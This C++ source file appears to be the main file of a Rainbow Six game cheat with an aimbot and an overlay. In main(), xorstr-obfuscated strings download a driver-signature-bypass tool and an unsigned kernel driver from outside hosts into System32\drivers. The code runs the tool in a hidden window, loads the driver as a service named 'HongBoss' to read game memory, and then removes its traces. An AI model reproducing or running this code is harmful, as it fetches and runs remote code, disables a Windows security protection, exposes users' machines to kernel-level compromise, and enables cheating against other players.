#include <Windows.h>
#include <iostream>
#include "../Game.hpp"
#include "../Overlay.hpp"
#include <xmmintrin.h>
#include "../Defines.hpp"
#include "../globals.hpp"
#include <random>
#include "../xorstr.h"
#include "../Kernel/Memory.h"
#pragma warning(disable : 4996)
#pragma comment(lib, "urlmon.lib")

HWND hwnd = nullptr;

auto UpdateEnts()
{
	while (true)
	{
		std::vector<entity_t> tmp = { {} };
		for (int i = 0; i < globals.entityCount; i++)
		{
			uint64_t player = mem->RPM<uint64_t>(globals.entityList + (i * sizeof(uint64_t)));
			if (!player) continue;

			uint64_t pawn = Game::Pawn(player);
			if (!pawn) continue;

			if (globals.teamcheck)
			{
				globals.TeamID = Game::get_team_id(globals.replicationinfo);
				uint64_t replicationInfo = Game::ReplicationInfo(player);
				if (Game::get_team_id(replicationInfo) == globals.TeamID) continue;
			}

			entity_t entity{ {} };
			entity.controller = player;
			entity.pawn = pawn;
			tmp.push_back(entity);
		}
		Visuals::entities = tmp;
		std::this_thread::sleep_for(std::chrono::milliseconds(350));
	}
}

BOOL load_driver(string TargetDriver, string TargetServiceName, string TargetServiceDesc)
{
	SC_HANDLE ServiceManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (!ServiceManager) return FALSE;
	SC_HANDLE ServiceHandle = CreateService(ServiceManager, TargetServiceName.c_str(), TargetServiceDesc.c_str(), SERVICE_START | DELETE | SERVICE_STOP, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, TargetDriver.c_str(), NULL, NULL, NULL, NULL, NULL);
	if (!ServiceHandle)
	{
		ServiceHandle = OpenService(ServiceManager, TargetServiceName.c_str(), SERVICE_START | DELETE | SERVICE_STOP);
		if (!ServiceHandle) return FALSE;
	}
	if (!StartServiceA(ServiceHandle, NULL, NULL)) return FALSE;
	CloseServiceHandle(ServiceHandle);
	CloseServiceHandle(ServiceManager);
	return TRUE;
}

auto aimbot_thread() -> void {
	while (1) {
		Visuals::aimbot();
		std::this_thread::sleep_for(10ms);
	}
}

int main()
{
	while (!hwnd)
	{
		hwnd = FindWindow(NULL, xorstr_("Rainbow Six"));
	}

	std::cout << xorstr_("[+] Found Rainbow Six") << std::endl;

	URLDownloadToFile(NULL, xorstr_("https://github.com/katlogic/WindowsD/releases/download/v2.2/wind64.exe"), xorstr_("C:\\Windows\\System32\\drivers\\KD.exe"), 0, NULL);
	URLDownloadToFile(NULL, xorstr_("http://core24.net/Kain/File/Uranus_Main.sys"), xorstr_("C:\\Windows\\System32\\drivers\\gcjxhcdbbs13.sys"), 0, NULL);
	ShellExecute(0, xorstr_("open"), xorstr_("C:\\Windows\\System32\\drivers\\KD.exe"), xorstr_(" /I"), 0, SW_HIDE);
	Sleep(1000);
	load_driver(xorstr_("C:\\Windows\\System32\\drivers\\gcjxhcdbbs13.sys"), xorstr_("HongBoss"), xorstr_("HongBoss"));
	Sleep(1000);
	ShellExecute(0, xorstr_("open"), xorstr_("C:\\Windows\\System32\\drivers\\KD.exe"), xorstr_(" /U"), 0, SW_HIDE);
	system("taskkill /im KD.exe");
	while (!mem->Init(xorstr_("RainbowSix.exe")))
		Sleep(1);

	globals.moduleBase = (uintptr_t)mem->ModuleBase;

	std::thread(Visuals::UpdateAddress).detach();
	std::thread(UpdateEnts).detach();
	std::thread(aimbot_thread).detach();

	setup_window();
	setup_directx(MyWnd);
	printf(xorstr_("success!"));

	while (true)
	{
		main_loop();
		std::this_thread::sleep_for(5ms);
	}

	std::getchar();
}
